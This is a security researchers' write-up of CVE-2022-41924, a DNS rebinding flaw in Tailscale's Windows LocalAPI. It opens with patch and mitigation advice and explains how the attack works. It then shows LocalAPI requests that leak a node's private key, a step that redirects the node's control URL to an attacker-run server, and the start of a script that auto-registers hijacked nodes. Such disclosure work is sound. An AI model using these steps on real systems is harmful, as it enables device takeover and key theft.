0 9 4" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3.83564 0.590546C4.21452 0.253758 4.78548 0.253758 5.16436 0.590546L9 4H0L3.83564 0.590546Z" fill="currentColor"></path></svg></span>GitHub</div></a><a class="relative flex items-center justify-center w-8 h-8 rounded-full bg-gray-600/10 dark:bg-gray-400/10 text-gray-700 dark:text-gray-400 hover:bg-gray-600/15 dark:hover:bg-gray-400/15 hover:text-black dark:hover:text-white transition-colors group" href="https://hachyderm.io/@emilyposting" rel="noopener noreferrer" target="_blank"><svg class="inline-block w-4 h-4" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="m 19.511621,6.5529853 c 0,-4.3325586 -2.858596,-5.62785744 -2.858596,-5.62785744 -2.769261,-1.25063495 -10.183739,-1.25063495 -12.9530035,0 0,0 -2.85859381,1.29529884 -2.85859381,5.62785744 0,5.1811997 -0.31265876,11.6130377 4.73454581,12.9083367 1.7866208,0.491322 3.3499146,0.580654 4.6005495,0.53599 2.277943,-0.134007 3.528578,-0.803981 3.528578,-0.803981 l -0.04466,-1.652625 c 0,0 -1.652625,0.491322 -3.483914,0.446655 -1.7866155,-0.08935 -3.7072318,-0.22332 -3.9752264,-2.41194 l -0.044657,-0.625317 c 3.8412328,0.937976 7.1018194,0.40199 7.9951284,0.312669 2.50127,-0.312669 4.689881,-1.875951 4.957876,-3.260582 0.446654,-2.2332757 0.40199,-5.4491947 0.40199,-5.4491947 z M 16.161703,12.136176 H 14.062424 V 7.0443035 c 0,-2.2332752 -2.858594,-2.3226069 -2.858594,0.312669 V 10.170902 H 9.1492155 V 7.3569732 c 0,-2.5905977 -2.8585926,-2.5459339 -2.8585926,-0.312669 v 5.0918718 h -2.09928 c 0,-5.4491951 -0.223321,-6.6104988 0.8039772,-7.8164697 1.1613071,-1.2952989 3.5732455,-1.3399665 4.6452174,0.2679762 l 0.5359855,0.8933087 0.535986,-0.8933087 c 1.071975,-1.6526252 3.483913,-1.5186297 4.60055,-0.2679762 1.071975,1.2506352 0.848644,2.3672746 0.848644,7.8164697 z" fill="currentColor"></path></svg><div class="absolute top-10 px-3 h-8 !leading-8 bg-black/80 text-white text-sm rounded-md whitespace-nowrap opacity-0 group-hover:opacity-100 group-focus:opacity-100 transition-opacity"><span class="block absolute text-black/80" style="top: -4px; left: 50%; margin-left: -4.5px; width: 9px; height: 4px;"><svg class="absolute" width="9" height="4" viewBox="0 0 9 4" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3.83564 0.590546C4.21452 0.253758 4.78548 0.253758 5.16436 0.590546L9 4H0L3.83564 0.590546Z" fill="currentColor"></path></svg></span>Mastodon</div></a><a class="relative flex items-center justify-center w-8 h-8 rounded-full bg-gray-600/10 dark:bg-gray-400/10 text-gray-700 dark:text-gray-400 hover:bg-gray-600/15 dark:hover:bg-gray-400/15 hover:text-black dark:hover:text-white transition-colors group" href="https://cohost.org/emilyposting" rel="noopener noreferrer" target="_blank"><svg viewBox="0 0 416 300" fill="none" xmlns="http://www.w3.org/2000/svg" class="inline-block w-5 h-5"><path fill-rule="evenodd" clip-rule="evenodd" d="M335.13 249.687c-26.067 15.965-56.123 28.509-90.166 37.631-37.809 10.131-73.445 14.192-106.908 12.183-33.463-2.008-61.9733-10.738-85.5305-26.188-23.5573-15.45-39.4399-38.491-47.64762-69.123-8.2548-30.807-6.03245-58.746 6.66702-83.818 12.6995-25.0714 33.0606-46.755 61.0832-65.0511 28.0229-18.296 60.9379-32.5095 98.7469-42.6402C209.008 2.59678 244.501-1.47294 277.854.471489 300.262 1.778 320.475 6.10779 338.49 13.4609c8.799 3.591 17.073 7.9031 24.824 12.9363 23.621 15.3393 39.536 38.325 47.744 68.957 8.208 30.6318 5.93 58.5388-6.834 83.7218-1.783 3.518-3.714 6.97-5.793 10.358-1.468-6.614-4.418-12.382-8.849-17.302-2.175-2.415-4.593-4.634-7.255-6.655-5.451-4.138-11.924-7.448-19.418-9.932-11.153-3.697-23.582-5.545-37.285-5.545-13.766 0-26.242 1.832-37.428 5.497-11.185 3.665-20.076 9.178-26.673 16.539-6.597 7.362-9.895 16.651-9.895 27.868 0 11.154 3.298 20.427 9.895 27.821 6.597 7.393 15.488 12.954 26.673 16.682 11.186 3.729 23.662 5.593 37.428 5.593 3.24 0 6.408-.104 9.506-.313Zm-119.254-19.859c-2.613 2.804-7.218 5.784-13.814 8.939-6.597 3.155-14.548 5.816-23.853 7.982-9.305 2.167-19.311 3.251-30.019 3.251-9.369 0-18.547-.908-27.533-2.725-8.987-1.816-17.113-4.7-24.379-8.652-7.2658-3.951-13.0497-9.114-17.3519-15.487-4.302-6.374-6.4531-14.118-6.4531-23.232 0-9.241 2.1511-17.049 6.4531-23.422 4.3022-6.374 10.0861-11.504 17.3519-15.392 7.266-3.888 15.392-6.708 24.379-8.461 8.986-1.753 18.164-2.629 27.533-2.629 10.771 0 20.714.956 29.828 2.868s16.937 4.414 23.47 7.505c6.533 3.091 11.265 6.389 14.197 9.895l-24.474 16.061c-3.569-3.888-8.987-6.995-16.252-9.321-7.266-2.327-16.093-3.49-26.482-3.49-5.099 0-10.246.399-15.44 1.195-5.194.797-9.958 2.151-14.292 4.063s-7.824 4.589-10.469 8.031c-2.645 3.442-3.967 7.807-3.967 13.097 0 5.227 1.322 9.545 3.967 12.954 2.645 3.41 6.135 6.119 10.469 8.127 4.334 2.007 9.098 3.425 14.292 4.254 5.194.829 10.341 1.243 15.44 1.243 10.197 0 19.041-1.275 26.529-3.824 7.489-2.55 12.763-5.482 15.823-8.796l25.047 15.966Zm109.748-3.729c13.321 0 23.646-2.39 30.976-7.17 7.329-4.78 10.994-11.121 10.994-19.025 0-8.094-3.681-14.451-11.042-19.072-7.362-4.621-17.671-6.931-30.928-6.931-13.32 0-23.693 2.31-31.118 6.931-7.425 4.621-11.138 10.978-11.138 19.072 0 8.031 3.713 14.404 11.138 19.121 7.425 4.716 17.798 7.074 31.118 7.074Z" fill="currentColor"></path></svg><div class="absolute top-10 px-3 h-8 !leading-8 bg-black/80 text-white text-sm rounded-md whitespace-nowrap opacity-0 group-hover:opacity-100 group-focus:opacity-100 transition-opacity"><span class="block absolute text-black/80" style="top: -4px; left: 50%; margin-left: -4.5px; width: 9px; height: 4px;"><svg class="absolute" width="9" height="4" viewBox="0 0 9 4" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3.83564 0.590546C4.21452 0.253758 4.78548 0.253758 5.16436 0.590546L9 4H0L3.83564 0.590546Z" fill="currentColor"></path></svg></span>Cohost</div></a><a class="relative flex items-center justify-center w-8 h-8 rounded-full bg-gray-600/10 dark:bg-gray-400/10 text-gray-700 dark:text-gray-400 hover:bg-gray-600/15 dark:hover:bg-gray-400/15 hover:text-black dark:hover:text-white transition-colors group" href="https://twitter.com/emilyposting_" rel="noopener noreferrer" target="_blank"><svg class="inline-block w-5 h-5" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18.0005 5.02869C17.4116 5.29638 16.7768 5.47229 16.119 5.55642C16.7921 5.15106 17.3122 4.50861 17.5569 3.73615C16.9221 4.11856 16.2185 4.38624 15.4766 4.53921C14.8724 3.88146 14.0234 3.49905 13.0598 3.49905C11.2624 3.49905 9.79399 4.96751 9.79399 6.78013C9.79399 7.04016 9.82458 7.29255 9.87812 7.52965C7.15536 7.39198 4.73089 6.08414 3.11712 4.10326C2.83414 4.5851 2.67353 5.15106 2.67353 5.74762C2.67353 6.8872 3.24714 7.89676 4.13433 8.47037C3.59131 8.47037 3.08653 8.31741 2.64294 8.08797V8.11091C2.64294 9.70173 3.77487 11.0325 5.27391 11.3308C4.79263 11.4625 4.28737 11.4808 3.79781 11.3843C4.00554 12.0363 4.41237 12.6068 4.96111 13.0156C5.50985 13.4244 6.17291 13.651 6.85709 13.6635C5.69734 14.5816 4.25976 15.0779 2.7806 15.0708C2.52056 15.0708 2.26053 15.0555 2.00049 15.0249C3.45364 15.9579 5.18213 16.501 7.03299 16.501C13.0598 16.501 16.3714 11.4991 16.3714 7.16253C16.3714 7.01722 16.3714 6.87955 16.3638 6.73424C17.0062 6.27534 17.5569 5.69408 18.0005 5.02869Z" fill="currentColor"></path></svg><div class="absolute top-10 px-3 h-8 !leading-8 bg-black/80 text-white text-sm rounded-md whitespace-nowrap opacity-0 group-hover:opacity-100 group-focus:opacity-100 transition-opacity"><span class="block absolute text-black/80" style="top: -4px; left: 50%; margin-left: -4.5px; width: 9px; height: 4px;"><svg class="absolute" width="9" height="4" viewBox="0 0 9 4" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3.83564 0.590546C4.21452 0.253758 4.78548 0.253758 5.16436 0.590546L9 4H0L3.83564 0.590546Z" fill="currentColor"></path></svg></span>Twitter</div></a><a class="relative flex items-center justify-center w-8 h-8 rounded-full bg-gray-600/10 dark:bg-gray-400/10 text-gray-700 dark:text-gray-400 hover:bg-gray-600/15 dark:hover:bg-gray-400/15 hover:text-black dark:hover:text-white transition-colors group" href="mailto:emily@downunderctf.com" rel="noopener noreferrer" target="_blank"><svg class="inline-block w-5 h-5" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9.99963 18C8.9063 18 7.87297 17.7899 6.89963 17.3696C5.9263 16.9499 5.07643 16.3765 4.35003 15.6496C3.6231 14.9232 3.04977 14.0733 2.63003 13.1C2.20977 12.1267 1.99963 11.0933 1.99963 10C1.99963 8.89333 2.20977 7.8568 2.63003 6.8904C3.04977 5.92347 3.6231 5.0768 4.35003 4.3504C5.07643 3.62347 5.9263 3.04987 6.89963 2.6296C7.87297 2.20987 8.9063 2 9.99963 2C11.1063 2 12.1428 2.20987 13.1092 2.6296C14.0762 3.04987 14.9228 3.62347 15.6492 4.3504C16.3762 5.0768 16.9495 5.92347 17.3692 6.8904C17.7895 7.8568 17.9996 8.89333 17.9996 10V11.16C17.9996 11.9467 17.7298 12.6165 17.19 13.1696C16.6498 13.7232 15.9863 14 15.1996 14C14.7196 14 14.273 13.8933 13.8596 13.68C13.4463 13.4667 13.1063 13.1867 12.8396 12.84C12.4796 13.2 12.0564 13.4835 11.57 13.6904C11.0831 13.8968 10.5596 14 9.99963 14C8.89297 14 7.94977 13.6099 7.17003 12.8296C6.38977 12.0499 5.99963 11.1067 5.99963 10C5.99963 8.89333 6.38977 7.94987 7.17003 7.1696C7.94977 6.38987 8.89297 6 9.99963 6C11.1063 6 12.0498 6.38987 12.83 7.1696C13.6098 7.94987 13.9996 8.89333 13.9996 10V11.16C13.9996 11.5467 14.1196 11.8499 14.3596 12.0696C14.5996 12.2899 14.8796 12.4 15.1996 12.4C15.5196 12.4 15.7996 12.2899 16.0396 12.0696C16.2796 11.8499 16.3996 11.5467 16.3996 11.16V10C16.3996 8.25333 15.7695 6.74987 14.5092 5.4896C13.2495 4.22987 11.7463 3.6 9.99963 3.6C8.25297 3.6 6.7495 4.22987 5.48923 5.4896C4.2295 6.74987 3.59963 8.25333 3.59963 10C3.59963 11.7467 4.2295 13.2499 5.48923 14.5096C6.7495 15.7699 8.25297 16.4 9.99963 16.4H13.9996V18H9.99963ZM9.99963 12.4C10.6663 12.4 11.233 12.1667 11.6996 11.7C12.1663 11.2333 12.3996 10.6667 12.3996 10C12.3996 9.33333 12.1663 8.76667 11.6996 8.3C11.233 7.83333 10.6663 7.6 9.99963 7.6C9.33297 7.6 8.7663 7.83333 8.29963 8.3C7.83297 8.76667 7.59963 9.33333 7.59963 10C7.59963 10.6667 7.83297 11.2333 8.29963 11.7C8.7663 12.1667 9.33297 12.4 9.99963 12.4Z" fill="currentColor"></path></svg><div class="absolute top-10 px-3 h-8 !leading-8 bg-black/80 text-white text-sm rounded-md whitespace-nowrap opacity-0 group-hover:opacity-100 group-focus:opacity-100 transition-opacity"><span class="block absolute text-black/80" style="top: -4px; left: 50%; margin-left: -4.5px; width: 9px; height: 4px;"><svg class="absolute" width="9" height="4" viewBox="0 0 9 4" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3.83564 0.590546C4.21452 0.253758 4.78548 0.253758 5.16436 0.590546L9 4H0L3.83564 0.590546Z" fill="currentColor"></path></svg></span>Email</div></a></nav></div></header><div class="max-w-screen-lg px-6 pt-8 mx-auto"><div class="pb-8"><a href="/" class="inline-flex items-center gap-1 text-sm text-gray-500/80 hover:text-gray-700 transition-colors" title="Back to Index Page"><svg class="inline-block w-5 h-5" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M6.91675 14.4167L3.08341 10.5833C3.00008 10.5 2.94119 10.4097 2.90675 10.3125C2.87175 10.2153 2.85425 10.1111 2.85425 10C2.85425 9.88889 2.87175 9.78472 2.90675 9.6875C2.94119 9.59028 3.00008 9.5 3.08341 9.41667L6.93758 5.5625C7.09036 5.40972 7.27786 5.33334 7.50008 5.33334C7.7223 5.33334 7.91675 5.41667 8.08341 5.58334C8.23619 5.73611 8.31258 5.93056 8.31258 6.16667C8.31258 6.40278 8.23619 6.59722 8.08341 6.75L5.66675 9.16667H16.6667C16.9029 9.16667 17.1006 9.24639 17.2601 9.40584C17.4201 9.56584 17.5001 9.76389 17.5001 10C17.5001 10.2361 17.4201 10.4339 17.2601 10.5933C17.1006 10.7533 16.9029 10.8333 16.6667 10.8333H5.66675L8.10425 13.2708C8.25703 13.4236 8.33341 13.6111 8.33341 13.8333C8.33341 14.0556 8.25008 14.25 8.08341 14.4167C7.93064 14.5694 7.73619 14.6458 7.50008 14.6458C7.26397 14.6458 7.06953 14.5694 6.91675 14.4167Z" fill="currentColor"></path></svg>Home</a></div><article><h1 class="text-4xl text-gray-900 dark:text-gray-100 font-bold">CVE-2022-41924 - RCE in Tailscale, DNS Rebinding, and You</h1><p>25 min read</p><p class="mt-1 text-gray-500"><p>Jamie McClymont &amp; Emily Trau</p><time dateTime="2022-11-22T00:00:00.000Z">2022-11-22</time></p><div class="mt-8 markdown-body" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"><h2 id="tldr-recommendations"><a class="anchor" aria-hidden="true" tabindex="-1" href="#tldr-recommendations"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>TL;DR Recommendations</h2><h3 id="for-issues-1-6"><a class="anchor" aria-hidden="true" tabindex="-1" href="#for-issues-1-6"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>For Issues 1-6</h3><p>Update to Tailscale <strong>v1.32.3</strong>, which was released today. Note that Tailscale
does not automatically update itself. Administrators can see the current version
running on all devices on the Tailscale admin page. <!-- todo headscale --></p>
<p>In descending order of priority, update:</p>
<ol>
<li>Windows machines with web browsers</li>
<li>Other machines with web browsers</li>
<li>Machines without web browsers</li>
</ol>
<p>See Tailscale&#39;s
<a href="https://tailscale.com/blog/windows-security-vulnerabilities/" title="null" rel="noopener noreferrer">blog post</a> and
<a href="https://tailscale.com/security-bulletins/" title="null" rel="noopener noreferrer">bulletins (TS-2022-004 and TS-2022-005)</a>.</p>
<h3 id="for-issue-7"><a class="anchor" aria-hidden="true" tabindex="-1" href="#for-issue-7"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>For Issue 7</h3><p>If you run non-HTTPS web services on your Tailnet, and those services are
unauthenticated <em>or</em> rely on Tailscale for authentication, implement an
allowlist of expected HTTP <code>Host</code> headers to prevent malicious Javascript from
accessing these services.</p>
<p>This mitigation can be tested with <code>curl</code> – if you can put something random in
the <code>Host</code> header, and you can view information or take actions which should not
be available to the public, action is required:</p>
<p><img src="/posts/tailscale/dns-rebinding.png" alt="" title="" /></p>
<p>Alternatively, you can use Tailscale&#39;s built-in TLS certificate support to run
internal services with HTTPS (and with HTTP disabled or just redirecting to
HTTPS), either <a href="https://tailscale.com/blog/tls-certs/" title="null" rel="noopener noreferrer">directly</a> or via
something like <a href="https://tailscale.com/blog/caddy/" title="null" rel="noopener noreferrer">caddy</a>.</p>
<p>Tailscale has published remediation advice for this issue
<a href="https://tailscale.com/kb/1196/security-hardening/#prevent-dns-rebinding-attacks" title="null" rel="noopener noreferrer">here</a>.</p>
<h3 id="overall"><a class="anchor" aria-hidden="true" tabindex="-1" href="#overall"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Overall</h3><p>Keep using Tailscale! 💕</p>
<p>The speed and quality of Tailscale&#39;s response to our report is unlike any vendor
interaction I have experienced, and suggests a deep commitment to keeping their
customers safe.</p>
<hr>
<h2 id="background"><a class="anchor" aria-hidden="true" tabindex="-1" href="#background"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Background</h2><p>Tailscale is a mesh VPN service: nodes on a Tailscale network establish direct
Wireguard connections to one another on-demand, using information pushed out by
a central control plane (what IPs each node can be found at, what Wireguard
public keys they use, which nodes are allowed to access which ports, etc.).</p>
<p>On each node, a process called tailscaled does all the heavy lifting – talking
to the control plane, setting up the TUN interface, and carrying packets back
and forth. A separate process provides a tray icon and configuration GUI in the
Windows taskbar (or the macOS menu bar). On Linux, configuration is performed
solely through the <code>tailscale</code> command-linux utility. These front-end interfaces
communicate with <code>tailscaled</code> through an HTTP API called the LocalAPI.</p>
<p>On unix platforms, the LocalAPI is bound to an <code>AF_UNIX</code> socket, with a tiered
permission structure (basic read-only access for most unix users, privileged
access for <code>root</code> or another specially designated user).</p>
<p>On Windows, which lacks (or
<a href="https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/" title="null" rel="noopener noreferrer">lacked!</a>)
<code>AF_UNIX</code>, the LocalAPI instead binds to a loopback TCP socket,
<code>127.0.0.1:41112</code>. It checks <code>netstat</code> to enforce that incoming TCP connections
are from the expected Windows user, emulating the unix socket privilege model
described above.</p>
<p>In a world where our computers run only trusted code, these two approaches would
provide equivalent security to one another. The world we actually live in is
much, much, messier.</p>
<h2 id="the-treacherous-user-agent"><a class="anchor" aria-hidden="true" tabindex="-1" href="#the-treacherous-user-agent"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>The Treacherous User Agent</h2><p>If you visit my website, I am granted the honour and the privilege of executing
arbitrary Javascript on your computer.</p>
<p>This is a pretty bad idea, but luckily even the web browser has its limits. If
my code asks, for example, to perform an HTTP request to
<code>/var/run/tailscale/tailscaled.sock</code>, I will be laughed out of the V8 engine
before I can so much as <code>connect(3)</code>.</p>
<p>If my code asks to speak to <code>127.0.0.1:41112</code>, the browser is a little more
receptive... but only a little. The types of requests I can make are limited,
and I cannot read the responses.</p>
<p>If, on the other hand, my code asks to speak to my very own website... what
could possibly be malicious about that? The browser allows abitrary requests to
be made, and responses to be read.</p>
<p>This last idea is known as the <strong>Same-Origin Policy</strong>, and is a critical layer
of asbestos fireproofing keeping the modern web from going up in flames.</p>
<p>Unfortunately, the Same-Origin Policy is somewhat flawed in its interpretation
of what is and is not &quot;my website&quot;. Let&#39;s say I host my website at the memorable
domain of <code>s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it</code>:</p>
<pre>
$ host s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it
<i>s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it has address <b>1.2.3.4</b></i>
$ host s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it
<i>s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it has address <b>127.0.0.1</b></i>
</pre>

<p>When my web page (which was initially loaded from a server at <code>1.2.3.4</code>) wishes
the make a request to its own domain, the browser will check with DNS again,
just in case I&#39;ve decided to move my web server down the street in the time
since you loaded the page. Surprisingly, I have! My web server is now located at
<code>127.0.0.1</code>!</p>
<p>The browser dutifully carries out the request to this new IP address, without
ever deeming the request to be Cross-Origin, since the domain of the webpage
matches the domain of the new request. This is called a DNS Rebinding attack.</p>
<div class="issue-panel">

<h3 id="issue-1---localapi-vulnerable-to-dns-rebinding-on-windows"><a class="anchor" aria-hidden="true" tabindex="-1" href="#issue-1---localapi-vulnerable-to-dns-rebinding-on-windows"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 1 - LocalAPI vulnerable to DNS Rebinding on Windows</h3><p><strong>CVE</strong>: CVE-2022-41924<br> <strong>Advisory</strong>:
<a href="https://tailscale.com/security-bulletins/#ts-2022-004" title="null" rel="noopener noreferrer">TS-2022-004</a> <br>
<em>Resolved in <code>1.32.3</code> (<code>Host</code> header allowlist implemented)</em></p>
</div>

<p>Applying this technique, our malicious website can make arbitrary requests to
the LocalAPI. Since the API does not apply any additional authentication, apart
from checking that our browser is running as the same Windows user as the
Tailscale GUI, we have full privileges, and can introspect and reconfigure
<code>tailscaled</code> to taste.</p>
<p>What will we do with our newfound abilities?</p>
<h2 id="information-disclosure"><a class="anchor" aria-hidden="true" tabindex="-1" href="#information-disclosure"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Information Disclosure</h2><p>The <code>status</code> and <code>whois</code> endpoints expose details (hostnames, TS and real IP
addresses, service lists) of the machines on the tailnet, as well as the names,
email addresses, and profile pictures of machines&#39; owners.</p>
<p>We can also learn the Wireguard private key used by the node. This is sanitised
when the preferences are requested:</p>
<div class="highlight highlight-source-javascript notranslate"><pre><span class="token constant">GET</span> <span class="token operator">/</span>localapi<span class="token operator">/</span>v0<span class="token operator">/</span>prefs <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>

<span class="token operator">...</span>
<span class="token string-property property">"PrivateNodeKey"</span><span class="token operator">:</span> <span class="token string">"privkey:0000000000000000000000000000000000000000000000000000000000000000"</span><span class="token punctuation">,</span>
<span class="token operator">...</span></pre></div><p>...but is revealed when preferences are updated:</p>
<div class="highlight highlight-source-javascript notranslate"><pre><span class="token constant">PATCH</span> <span class="token operator">/</span>localapi<span class="token operator">/</span>v0<span class="token operator">/</span>prefs <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
<span class="token punctuation">{</span><span class="token punctuation">}</span>

<span class="token operator">...</span>
<span class="token string-property property">"PrivateNodeKey"</span><span class="token operator">:</span> <span class="token string">"privkey:d8e0d574e0ef19adafe8ed83b6068f6dd47c4c2e3062342f4673c63488e5f75e"</span><span class="token punctuation">,</span>
<span class="token operator">...</span></pre></div><p>This key should allow us to impersonate the targeted Windows node on the
tailnet, opening Wireguard connections and accessing private services that
should not be exposed to us. Unfortunately, there are some additional custom
packets required to talk to a Tailscale node on top of pure Wireguard. The
relevant code is open source, but using it would require writing an
unconscionable amount of Go. Thus, we move on...</p>
<h2 id="becoming-the-control-plane"><a class="anchor" aria-hidden="true" tabindex="-1" href="#becoming-the-control-plane"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Becoming the Control Plane</h2><p>A <code>PATCH</code> to <code>/localapi/v0/prefs</code> can be used to update <code>ControlURL</code>, moving the
machine to an attacker-controlled control plane server, away from the default of
<code>https://controlplane.tailscale.com</code>. The third-party open-source control plane
server implementation, <a href="https://github.com/juanfont/headscale" title="null" rel="noopener noreferrer">Headscale</a>, will
serve our purposes nicely.</p>
<p>Unfortunately, the <code>ControlURL</code> change doesn&#39;t take effect until the Tailscale
client is restarted. In practice, this will likely mean waiting for the whole
machine to reboot – likely not an insurmountable restriction in the age of
automatic Windows Update installation.</p>
<p>We can process Headscale&#39;s logs to automatically accept new machines that appear
into our malicious tailnet:</p>
<p><details>
<summary><code><span class="hljs-keyword">while</span>(&lt;&gt;){<span class="hljs-regexp">/(?&lt;=ter\/)nodekey:\w*/</span>&amp;&amp;<span class="hljs-string">`headscale -n meow nodes register --key $&amp;`</span>}
</code></summary>

<div class="highlight highlight-source-python notranslate"><pre><span class="token keyword">import</span> re
<span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> sys

seen <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">rb"(?&lt;=/register/)nodekey:[^ ]*"</span><span class="token punctuation">)</span>

